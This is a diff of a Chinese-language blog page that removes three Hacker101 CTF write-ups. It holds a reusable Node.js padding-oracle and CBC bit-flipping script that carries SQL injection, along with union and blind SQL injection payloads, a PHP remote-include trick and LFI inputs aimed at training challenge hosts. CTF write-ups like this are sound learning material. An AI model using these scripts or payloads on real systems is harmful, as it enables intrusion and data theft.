@@ -163,95 +163,17 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
             
         </h1>
         <div class="content">
-            <h1><span id="encrypted-pastebin">Encrypted Pastebin</span></h1>
-<p>這題總共有四個 flag</p>
-<p>&lt;!-- more --&gt;</p>
-<h2><span id="0x00">0x00</span></h2>
-<p>一開始畫面長這樣<br>
-<img src="/images/ctf/part6-aes-1-01.png" alt></p>
-<p>試著輸入值之後，發現上面有一段 <code>?post=</code> 資料<br>
-<img src="/images/ctf/part6-aes-1-02.png" alt></p>
-<p>嘗試更改之後，發現 flag<br>
-<img src="/images/ctf/part6-aes-1-03.png" alt></p>
-<h2><span id="0x01">0x01</span></h2>
-<p>根據上一個 error message 得知有用到 base64<br>
-所以可以知道 <code>?post=</code> 的是 base64<br>
-接下來再輸入一些奇怪的值試試看<br>
-<img src="/images/ctf/part6-aes-2-01.png" alt></p>
-<p>發現程式使用的是 aes-128-cbc 去把資料作加密<br>
-且根據錯誤訊息表示 IV 要為 16 bytes，代表 post 是需要帶入 IV 進去的<br>
-那根據<a href="https://skysec.top/2017/12/13/padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/">這篇</a>解釋 aes 加解密以及存在的 padding oracle 攻擊<br>
-得知透過修改 iv 可以對解密後的資料做 XOR，進而達到目標 payload<br>
-主要公式如下:<br>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; new_iv 為攻擊者構造的 iv</span><br><span class="line">&#x2F;&#x2F; iv 為原本的 iv</span><br><span class="line">&#x2F;&#x2F; plain 為明文</span><br><span class="line">&#x2F;&#x2F; middle 代表透過 aes 解密後，但還未經過 xor 的時候的 payload</span><br><span class="line">公式 1: plain[i] &#x3D; middle[i] XOR iv[i]</span><br><span class="line">公式 2: 0x01 &#x3D; middle[i] XOR new_iv[i]</span><br><span class="line">公式 3: middle[i] &#x3D; 0x01 XOR new_iv[i]</span><br><span class="line">公式 4: plain[i]&#x3D; 0x01 XOR new_iv[i] XOR iv[i]</span><br></pre></td></tr></table></figure>
-透過以上公式可以推斷出明文，這邊用 16bytes 去排版，方便後續說明
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;flag&quot;: &quot;^FLAG^</span><br><span class="line">a38f2d9e2659df72</span><br><span class="line">12c341bc01a2cf82</span><br><span class="line">8c7d663978eb476a</span><br><span class="line">c6d664a03f49c08c</span><br><span class="line">$FLAG$&quot;, &quot;id&quot;: &quot;</span><br><span class="line">3&quot;, &quot;key&quot;: &quot;rTU2</span><br><span class="line">s8qRJ4uRRdLFJbt-</span><br><span class="line">YA~~&quot;&#125;\n\n\n\n\n\n\n\n\n\n</span><br></pre></td></tr></table></figure></p>
-<h2><span id="0x02">0x02</span></h2>
-<p>因為上一題有發現 id 為 3<br>
-於是開始繼續利用上一個 flag 提到的文章裡面的翻轉攻擊去修改解密後的明文<br>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; new_iv 為攻擊者構造的 iv</span><br><span class="line">&#x2F;&#x2F; iv 為原本的 iv</span><br><span class="line">&#x2F;&#x2F; plain 為明文</span><br><span class="line">&#x2F;&#x2F; middle 代表透過 aes 解密後，但還未經過 xor 的時候的 payload</span><br><span class="line">&#x2F;&#x2F; &#39;x&#39; 為我們想要把解密後的值透過 xor 後變成的結果</span><br><span class="line">公式 1: plain[i] &#x3D; middle[i] XOR iv[i]</span><br><span class="line">公式 2: &#39;x&#39; &#x3D; middle[i] XOR new_iv[i]</span><br><span class="line">公式 3: &#39;x&#39; XOR new_iv[i] XOR iv[i] &#x3D; plain[i]</span><br><span class="line">公式 4: new_iv[i] &#x3D; plain[i] XOR &#39;x&#39; XOR iv[i]</span><br></pre></td></tr></table></figure></p>
-<p>透過上面公式可以去修改原本的 payload<br>
-這裡我們先只拿第一段來做修改，先省略掉其他 payload<br>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">原本 iv: 05694ed4efacf438e310a4fc54ff2826</span><br><span class="line">原本明文: &#123;&quot;flag&quot;: &quot;^FLAG^</span><br><span class="line">預期明文: &#123;&quot;id&quot;: &quot;1&quot;&#125;\x05\x05\x05\x05\x05 (記得不夠是要 padding value)</span><br><span class="line"></span><br><span class="line">原本的值: 05694ed4efacf438e310a4fc54ff28265a813ad8376339531ea70324a0ce85c8</span><br><span class="line">更改後的: 056941dcacf1f620f21087bf1dbb6a7d5a813ad8376339531ea70324a0ce85c8</span><br></pre></td></tr></table></figure>
-上面可以發現前面 32 bytes 的 iv 已經變了<br>
-把這個 payload 塞回去得到下面得結果<br>
-<img src="/images/ctf/part6-aes-3-01.png" alt></p>
-<p>果然 QQ，原本以為還是要有 key 才能去解開，不能只單純改 id<br>
-因為原本 id 在第 7 個 block<br>
-所以改了第 6 個的 block，讓 id 所在的 block 從 3 -&gt; 1<br>
-但改了第 6 個的 block，解密出來一定會有問題<br>
-所以要先知道改了第 6 個 block 後的明文，再去回推第 5 個 block 應該要什麼值<br>
-才能讓更改後的第 6 個 block XOR 後才能解回原本應有的值<br>
-以此類推，要更改到最面的 iv block 才算完成<br>
-但全部改完之後出現下面訊息，看來跟上面直接改 id 是一樣的<br>
-看來 key 是拿去做進一層解密內容使用，所以直接改 id 不需要 key 就可以了，有點白做了 XD<br>
-<img src="/images/ctf/part6-aes-3-02.png" alt></p>
-<h2><span id="0x03">0x03</span></h2>
-<p>這一題試著把 id 改成單引號發生一件事情<br>
-<img src="/images/ctf/part6-aes-4-01.png" alt>
-SQL Injection 出現了, 所以就需要把 payload 改成 SQL Injection 用的<br>
-至於為什麼要用 SQL Injection 的原因是因為前一個 flag 只有顯示 title，但內容因為 key 問題所以沒有顯示出來<br>
-所以只能透過 SQL Injection 去 dump 出資料庫看看有什麼可以幫助解開前一個 flag 的內容<br>
-大概是長下面的樣子，透過替換掉前面的 FLAG 達到更換 id 以及保留 key 的值<br>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;id&quot;: &quot;9 union </span><br><span class="line">all select datab</span><br><span class="line">ase(),user()&quot;, &quot;</span><br><span class="line">aa&quot;: &quot;xxxxxxxxxx</span><br><span class="line">c6d664a03f49c08c</span><br><span class="line">$FLAG$&quot;, &quot;bb&quot;: &quot;</span><br><span class="line">3&quot;, &quot;key&quot;: &quot;rTU2</span><br><span class="line">s8qRJ4uRRdLFJbt-</span><br><span class="line">YA~~&quot;&#125;</span><br></pre></td></tr></table></figure></p>
-<p>這樣就 dump 出 database 的資訊了(level3 以及 root@localhost 那個)<br>
-<img src="/images/ctf/part6-aes-4-02.png" alt>
-<img src="/images/ctf/part6-aes-4-03.png" alt></p>
-<p>再來 dump 出 tables<br>
-<img src="/images/ctf/part6-aes-4-04.png" alt></p>
-<p>dump 出 columns<br>
-<img src="/images/ctf/part6-aes-4-05.png" alt></p>
-<p>透過 dump 出來的 tables 和 columns，去把 tracking 列出資料來<br>
-<img src="/images/ctf/part6-aes-4-06.png" alt></p>
-<p>發現有一筆資料是對 localhost 運行的結果<br>
-把 post= 後面的值帶到瀏覽器後發現 flag4 (黑色大標是 flag3，下面小字為內容才是 flag4)<br>
-<img src="/images/ctf/part6-aes-4-07.png" alt></p>
-<p>下面整理當時寫出來的 SQL Injection 搭配 Padding Oracle 程式碼 (有點亂 XD)<br>
-程式基本邏輯為下:</p>
-<ol>
-<li>透過 padding oracle 找到原本明文</li>
-<li>透過翻轉攻擊構造假 iv 達到預期目標的明文</li>
-<li>解完最右邊那一個 block 後，繼續慢慢往左邊一次解一個 block 解下去</li>
-</ol>
-<p>要注意的地方是最外層的 for 迴圈一定要從第 9 個往下遞減跑下去<br>
-每次跑完如果 request 量太多的導致中斷連線的話<br>
-會顯示下一個要解的 block，以及下一個 payload 應該帶什麼，去防止中斷<br>
-因為這邊是直接一次 call 256 的 request 去找比較快，所以很容易斷 XD<br>
-最後面要注意的是 wantedPlainText 一定要是 16 bytes 唯一組才可以</p>
-<p>想要直接使用這個程式碼的直接改兩個大點即可</p>
-<ol>
-<li>originalPayload 的那一段 base64 改成正常 request 的 base64</li>
-<li>把 <code>http://34.74.105.127/548dbda597/?post=</code> 改成你自己的即可</li>
-</ol>
-<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> getPayload = <span class="function">(<span class="params">paddingOracleValue, paddingValue, answer</span>) =&gt;</span> &#123;</span><br><span class="line">    answer.reverse()</span><br><span class="line">    answer[paddingOracleValue] = paddingValue</span><br><span class="line">    answer.reverse()</span><br><span class="line">    <span class="keyword">return</span> answer.toString(<span class="string">'hex'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> setBlock = <span class="function">(<span class="params">allBlocks, targetBlock, paddingOracleValue, paddingValue, answer</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> startPosition = targetBlock * <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">const</span> previousBlockEndPosition = startPosition - <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">let</span> first = allBlocks.substring(<span class="number">0</span>, previousBlockEndPosition);</span><br><span class="line">    <span class="keyword">let</span> end = allBlocks.substring(startPosition);</span><br><span class="line">    <span class="keyword">return</span> first + getPayload(paddingOracleValue, paddingValue, answer) + end;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> encodeHexToBase64 = <span class="function">(<span class="params">payload</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Buffer.from(payload, <span class="string">'hex'</span>).toString(<span class="string">'base64'</span>).replace(<span class="regexp">/\=/g</span>, <span class="string">'~'</span>).replace(<span class="regexp">/\//g</span>, <span class="string">"!"</span>).replace(<span class="regexp">/\+/g</span>, <span class="string">"-"</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> decodeBase64ToHex = <span class="function">(<span class="params">payload</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Buffer.from(payload.replace(<span class="regexp">/\~/g</span>, <span class="string">'='</span>).replace(<span class="regexp">/\!/g</span>, <span class="string">"/"</span>).replace(<span class="regexp">/\-/g</span>, <span class="string">"+"</span>), <span class="string">'base64'</span>).toString(<span class="string">'hex'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>);</span><br><span class="line">    <span class="comment">// original</span></span><br><span class="line">    <span class="keyword">let</span> originalPayload = decodeBase64ToHex(<span class="string">"H6KJsPhBWKtdEt3LZnTuf8K5!-B69-TxsTNIze9!0Wrss6wGzNUKwi-aaz8WfDVnBrb2UsO7tuAhRej9F05Fexm6MihRiLDQO1vNGPdAgGZAWo11!Mw1tAdnhvdOZra3gJ99qA1adxSD!s97jVbcizRIXZ!MHVKw4jVNAplCiqzYtXJNNhxCXsJIPRKDptSLgukPWBN!wEY2e1nCQPYVrQ~~"</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">3</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">let</span> block = i</span><br><span class="line">        <span class="keyword">let</span> plain = []</span><br><span class="line">        <span class="keyword">let</span> plainText = [];</span><br><span class="line">        <span class="keyword">let</span> rawPayload = originalPayload.substring(<span class="number">0</span>, (block + <span class="number">1</span>) * <span class="number">32</span>)</span><br><span class="line">        <span class="keyword">let</span> previousIv = originalPayload.substring((block - <span class="number">1</span>) * <span class="number">32</span>, (block) * <span class="number">32</span>)</span><br><span class="line">        <span class="keyword">let</span> answer = Buffer.from(<span class="string">"00000000000000000000000000000000"</span>, <span class="string">'hex'</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> paddingOracleValue = <span class="number">0</span>; paddingOracleValue &lt; <span class="number">16</span>; paddingOracleValue++) &#123;</span><br><span class="line">            <span class="keyword">let</span> job = []</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; <span class="number">256</span>; index++) &#123;</span><br><span class="line">                <span class="keyword">let</span> paddingValue = index;</span><br><span class="line">                <span class="keyword">let</span> blocksToBeDecrypt = setBlock(rawPayload, block, paddingOracleValue, paddingValue, answer)</span><br><span class="line">                payload = encodeHexToBase64(blocksToBeDecrypt)</span><br><span class="line">                job.push(axios.get(<span class="string">`http://34.74.105.127/548dbda597/?post=<span class="subst">$&#123;payload&#125;</span>`</span>))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">let</span> results = <span class="keyword">await</span> <span class="built_in">Promise</span>.all(job).catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(error)</span><br><span class="line">            &#125;)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; results.length; index++) &#123;</span><br><span class="line">                <span class="keyword">let</span> paddingValue = index;</span><br><span class="line">                <span class="keyword">if</span> (!results[index].data.includes(<span class="string">'PaddingException'</span>)) &#123;</span><br><span class="line">                    <span class="keyword">let</span> originalIv = Buffer.from(rawPayload, <span class="string">'hex'</span>)</span><br><span class="line">                    <span class="keyword">let</span> tempPlainText = paddingValue ^ (paddingOracleValue + <span class="number">1</span>);</span><br><span class="line">                    plainText.push(tempPlainText);</span><br><span class="line">                    plain.unshift(Buffer.from([tempPlainText ^ originalIv[(block) * <span class="number">16</span> - <span class="number">1</span> - paddingOracleValue]]).toString(<span class="string">'hex'</span>))</span><br><span class="line">                    answer.reverse()</span><br><span class="line">                    <span class="keyword">let</span> nextPaddingOracleValue = (paddingOracleValue + <span class="number">2</span>);</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; plainText.length; index++) &#123;</span><br><span class="line">                        answer[index] = plainText[index] ^ nextPaddingOracleValue;</span><br><span class="line">                    &#125;</span><br><span class="line">                    answer.reverse()</span><br><span class="line">                    <span class="built_in">console</span>.log(plain);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">const</span> wantedPlainText = [</span><br><span class="line">            <span class="string">'&#123;"id": "9 union '</span>,</span><br><span class="line">            <span class="string">'all select group'</span>,</span><br><span class="line">            <span class="string">'_concat(headers)'</span>,</span><br><span class="line">            <span class="string">' ,2 FROM trackin'</span>,</span><br><span class="line">            <span class="string">'g", "b": "bbbbbb'</span>,</span><br><span class="line">            <span class="string">'bbbbbbbbbbbbbbbb'</span>,</span><br><span class="line">            <span class="string">'bbbbbbbbbbbbbbbb'</span>,</span><br><span class="line">            <span class="string">'bbb", "bbbbbb":"'</span>,</span><br><span class="line">            <span class="string">'YA~~"&#125;\n\n\n\n\n\n\n\n\n\n'</span></span><br><span class="line">        ]</span><br><span class="line">        <span class="keyword">const</span> originalIv = Buffer.from(previousIv, <span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">const</span> change = plain.map(<span class="function"><span class="params">item</span> =&gt;</span> <span class="built_in">parseInt</span>(item, <span class="number">16</span>))</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'old: '</span> + Buffer.from(change).toString());</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'new: '</span> + wantedPlainText[block - <span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">const</span> originPlainText = Buffer.from(change)</span><br><span class="line">        <span class="keyword">const</span> wanttedPlainText = Buffer.from(wantedPlainText[block - <span class="number">1</span>])</span><br><span class="line">        <span class="keyword">const</span> wanttedIv = []</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; wanttedPlainText.length; index++) &#123;</span><br><span class="line">            wanttedIv.push(originalIv[index] ^ originPlainText[index] ^ wanttedPlainText[index])</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> newIv = Buffer.from(wanttedIv).toString(<span class="string">'hex'</span>)</span><br><span class="line">        <span class="keyword">let</span> part1 = originalPayload.substring(<span class="number">0</span>, (block - <span class="number">1</span>) * <span class="number">32</span>);</span><br><span class="line">        <span class="keyword">let</span> part3 = originalPayload.substring((block) * <span class="number">32</span>);</span><br><span class="line">        originalPayload = <span class="string">`<span class="subst">$&#123;part1&#125;</span><span class="subst">$&#123;newIv&#125;</span><span class="subst">$&#123;part3&#125;</span>`</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`replaced block: <span class="subst">$&#123;block&#125;</span>`</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`next block: <span class="subst">$&#123;block - <span class="number">1</span>&#125;</span>`</span>);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`new payload: <span class="subst">$&#123;encodeHexToBase64(originalPayload)&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    axios.get(<span class="string">`http://34.74.105.127/548dbda597/?post=<span class="subst">$&#123;encodeHexToBase64(originalPayload)&#125;</span>`</span>).then(<span class="function">(<span class="params">response</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(response.data)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>
-<h1><span id="後記">後記</span></h1>
-<p>這題花了我很多時間解決 XD<br>
-本來想說最後的 SQL Injection 就不要解了，反正大概知道怎麼弄<br>
-但還是很想把它解出來，所以就還是想辦法透過程式自動化去找到最後的 flag<br>
-只是過程中一直修改 wantedPlainText 再加上還會一直斷線真的是有夠麻煩 XD</p>
-
+            <h1 id="Encrypted-Pastebin"><a href="#Encrypted-Pastebin" class="headerlink" title="Encrypted Pastebin"></a>Encrypted Pastebin</h1><p>這題總共有四個 flag</p>
         </div>
         
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2019/10/20/hacker101-part6/#more">繼續閱讀</a>
+                </div>
+            </div>
+        </div>
         
         
     </div>
@@ -295,91 +217,17 @@ SQL Injection 出現了, 所以就需要把 payload 改成 SQL Injection 用的<
             
         </h1>
         <div class="content">
-            <h1><span id="codys-first-blog">Cody's First Blog</span></h1>
-<p>這題總共有 3 個 flag
-&lt;!-- more --&gt;</p>
-<h2><span id="0x00">0x00</span></h2>
-<p>一開始畫面長這樣<br>
-<img src="/images/ctf/part5-blog-1-01.png" alt></p>
-<p>裡面有提到好像是用 php 建立的<br>
-試著提交看看 <code>&lt;?php echo phpinfo(); ?&gt;</code><br>
-就得到第一個 FLAG 了，但好像沒有像想像中一樣可以直接 phpinfo<br>
-<img src="/images/ctf/part5-blog-1-02.png" alt>
-<img src="/images/ctf/part5-blog-1-03.png" alt></p>
-<h2><span id="0x01">0x01</span></h2>
-<p>接下來看一下 source code 發現一個特別的地方</p>
-<ol>
-<li>被註解掉的 admin path
-<img src="/images/ctf/part5-blog-2-01.png" alt></li>
-</ol>
-<p>Path: http://34.74.105.127/8a10550a14/?page=admin.auth.inc<br>
-發現看到可以登入的地方<br>
-<img src="/images/ctf/part5-blog-2-02.png" alt></p>
-<p>嘗試輸入 username 看會不會有列舉的漏洞
-以及輸入一些弱密碼嘗試登入<br>
-全部都不行，暫時就先擱置不看<br>
-<img src="/images/ctf/part5-blog-2-03.png" alt></p>
-<p>這邊就開始有點卡住了 ...
-回去首頁看看有什麼特別的東西<br>
-有一句話有提到有用到 <code>include</code> 這個 function<br>
-而剛剛的參數中 <code>?page=admin.auth.inc</code> 是登入用的 php<br>
-接下來這邊試著改成 <code>?page=admin.inc</code> 發現就 bypass 登入的機制到 admin 頁面了<br>
-然後就發現 FLAG 以及可以 approve 剛剛 submit 的 comment<br>
-<img src="/images/ctf/part5-blog-2-04.png" alt></p>
-<h2><span id="0x02">0x02</span></h2>
-<p>按下 approve，是一個 GET Url<br>
-嘗試對 approve 做 SQL Injection 檢測發現沒有問題<br>
-<img src="/images/ctf/part5-blog-3-01.png" alt></p>
-<p>接下來回到首頁，檢視原始碼發現一個特別的東西<br>
-一開始輸入的參數被 approve 後顯示在這裡<br>
-有點特別，但因為不能執行所以沒什麼用就先擱著不動<br>
-<img src="/images/ctf/part5-blog-3-02.png" alt></p>
-<p>接下來嘗試對 page 參數亂打<br>
-<img src="/images/ctf/part5-blog-3-03.png" alt></p>
-<p>看來的確是用 include 去引入別的檔案<br>
-而且還會再參數後面再加入 .php 的副檔名</p>
-<p>這邊嘗試用 php://filter 看能不能讀取原始碼<br>
-結果發現不能 QQ
-<img src="/images/ctf/part5-blog-3-04.png" alt></p>
-<p>看到 include 後回想起首頁提到的<br>
-這個 server 不能對外連線，也只有作者可以上傳檔案<br>
-以及他都是用 include 去引用檔案</p>
-<p>這裡聯想到一件事情<br>
-include 是不是也能用 http:// 去把檔案引入並執行呢?<br>
-於是這邊嘗試引用 <code>http://34.74.105.127/8a10550a14/?page=http://localhost/admin.inc</code><br>
-發現可以引用成功，但還是沒有提供什麼資訊<br>
-<img src="/images/ctf/part5-blog-3-05.png" alt></p>
-<p>但因為用 include 配合 <code>http://</code> 會有一個特色<br>
-假如 test2.php 內容為
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $body = <span class="string">"&lt;?php echo phpinfo(); ?&gt;"</span> <span class="meta">?&gt;</span></span><br><span class="line">&lt;p&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $body <span class="meta">?&gt;</span>&lt;/p&gt;</span><br></pre></td></tr></table></figure></p>
-<p>test3.php 內容為
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">"test2.php"</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>直接讀取 test2.php 的時候，是沒辦法執行 <code>phpinfo()</code><br>
-只會出現這樣的結果<br>
-<img src="/images/ctf/part5-blog-3-06.png" alt></p>
-<p>讀取 test3.php 時<br>
-這邊會出現跟直接讀取 test2.php 一樣的結果<br>
-<img src="/images/ctf/part5-blog-3-08.png" alt></p>
-<p>但如果把 test3.php 改成用 <code>http://</code> 協議會怎麼樣呢?<br>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="string">"http://localhost:7888/test2.php"</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-它會把 test2.php 顯示的結果，當成原始碼繼續使用下去<br>
-結果就會變成可以成功執行 phpinfo 了<br>
-<img src="/images/ctf/part5-blog-3-07.png" alt></p>
-<p>那因為剛剛一開始頁面也有一樣的邏輯出現<br>
-首頁也有顯示 <code>&lt;?php echo phpinfo(); ?&gt;</code><br>
-<img src="/images/ctf/part5-blog-3-02.png" alt></p>
-<p>那如果說有辦法，讓這個頁面在被 include 一次的話<br>
-就可以成功執行 phpinfo() 了<br>
-所以 payload 會改成以下
-<code>http://34.74.105.127/8a10550a14/?page=http://localhost/index</code><br>
-然後就成功可以執行了<br>
-<img src="/images/ctf/part5-blog-3-09.png" alt></p>
-<p>重新輸入一個參數 <code>&lt;?php readfile(&quot;index.php&quot;) ?&gt;</code> 並且 approve<br>
-回到首頁檢視原始碼發現 FLAG !
-<img src="/images/ctf/part5-blog-3-10.png" alt></p>
-
+            <h1 id="Cody’s-First-Blog"><a href="#Cody’s-First-Blog" class="headerlink" title="Cody’s First Blog"></a>Cody’s First Blog</h1><p>這題總共有 3 個 flag<br>
         </div>
         
+        
+        <div class="level is-mobile">
+            <div class="level-start">
+                <div class="level-item">
+                <a class="button is-size-7 is-light" href="/2019/09/14/hacker101-part5/#more">繼續閱讀</a>
+                </div>
+            </div>
+        </div>
         
         
     </div>
@@ -423,73 +271,17 @@ include 是不是也能用 http:// 去把檔案引入並執行呢?<br>
             
         </h1>
         <div class="content">
-            <h1><span id="photo-gallery">Photo Gallery</span></h1>
-<p>&lt;!-- more --&gt;</p>
-<h2><span id="0x00">0x00</span></h2>
-<p>一開始畫面長這樣<br>
-<img src="/images/ctf/part4-photo-1-01.png" alt></p>
-<p>發現原始碼有一個 fetch?id=1<br>
-<img src="/images/ctf/part4-photo-1-02.png" alt></p>
-<p>點進去網址發現回傳一個 jpg 的 text 檔案<br>
-<img src="/images/ctf/part4-photo-1-03.png" alt></p>
-<p>從這可以推測他是用 id 去 mysql 取出 filename 然後讀出來的<br>
-加個 ' 發現好像沒有 SQL Injection 的存在，但卻出現 <code>500 Internal Server Error</code><br>
-可能程式有哪邊出錯了，繼續往下測試<br>
-<img src="/images/ctf/part4-photo-1-04.png" alt></p>
-<p>不過當改下 <code>fetch?id=1 union all select 1</code> 以及 <code>fetch?id=1 union all select 1,2</code> 發生一點不同變化
-前者出現跟 <code>fetch?id=1</code> 結果一模一樣 (上圖)<br>
-後者卻出現 <code>500 Internal Server Error</code> (下圖)<br>
-<img src="/images/ctf/part4-photo-1-05.png" alt>
-<img src="/images/ctf/part4-photo-1-06.png" alt></p>
-<p>看來就是有 SQL Injection 的問題了<br>
-接下來找到可以用 <code>fetch?id=1 and length(database()) = 6</code> 這種方式去判斷後者是否為 true<br>
-思路大概跟這篇做法一樣 https://www.hackthis.co.uk/articles/blind-sql-injection<br>
-用各種 <code>length()</code> 以及 <code>like '______'</code> 的方式可以找到相對應的值<br>
-這邊就直接丟 sqlmap 把整個 table dump 出來了<br>
-就發現 FLAG 了
-<img src="/images/ctf/part4-photo-1-07.png" alt></p>
-<h2><span id="0x01">0x01</span></h2>
-<p>這提跟前一提的 <code>fetch?id=1 union all select 1</code> Payload 有關係<br>
-前面有提到是透過 id 去撈 filename 回來去顯示<br>
-改成 <code>fetch?id=123123 union all select &quot;files/adorable.jpg&quot;</code> 發現可以正確觸發<br>
-<img src="/images/ctf/part4-photo-2-01.png" alt></p>
-<p>LFI 漏洞就出現了，我可以任意去讀檔案了<br>
-本來想說這 php 寫的網站用以下的 payload，結果取得不到 ...<br>
-<code>fetch?id=123123 union all select &quot;index.php&quot;</code>
-<img src="/images/ctf/part4-photo-2-02.png" alt></p>
